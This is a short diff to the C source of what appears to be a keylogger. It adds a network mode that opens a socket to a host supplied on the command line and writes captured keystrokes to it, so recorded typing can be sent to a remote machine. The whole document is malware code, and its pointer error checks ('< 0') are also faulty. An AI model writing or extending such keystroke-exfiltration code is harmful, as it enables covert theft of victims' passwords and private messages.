@@ -7,6 +7,7 @@
 #include <getopt.h>
 #include <errno.h>
 #include "keylogger.h"
+#include "networking.h"
 
 const char *get_platform_name();
 void print_usage_and_quit(char *application_name);
@@ -37,6 +38,13 @@ int main(int argc, char *argv[]) {
     else if(file) {
         if((writeout = fopen(option_input, "ab+")) < 0){
             printf("Error opening file %s: %s\n", argv[2], strerror(errno));
+            return 1;
+        }
+    }
+    else if(network){
+        writeout = fdopen(get_socket_file_descriptor(option_input, PORT), "ab+");
+        if(writeout < 0){
+            printf("Error creating socket on %s\n", option_input);
             return 1;
         }
     }
